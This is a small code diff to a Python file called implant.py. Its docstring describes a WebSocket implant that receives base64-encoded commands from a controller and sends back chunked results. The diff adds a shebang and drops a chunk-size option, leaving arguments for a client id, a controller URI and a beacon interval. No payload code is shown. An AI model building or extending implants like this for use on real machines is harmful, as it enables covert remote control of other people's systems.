@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 """
 implant.py - WebSocket implant that supports job_id, base64-encoded cmd & args, chunked base64 results,
 and a whitelist of cross-platform commands:
@@ -239,7 +240,6 @@ if __name__ == "__main__":
     parser.add_argument("--id", required=True, help="client id")
     parser.add_argument("--server", default="ws://127.0.0.1:8765", help="controller ws uri")
     parser.add_argument("--beacon", type=int, default=10, help="seconds between heartbeats")
-    parser.add_argument("--chunk", type=int, default=DEFAULT_CHUNK_SIZE, help="max chars per base64 chunk")
     args = parser.parse_args()
 
     try:
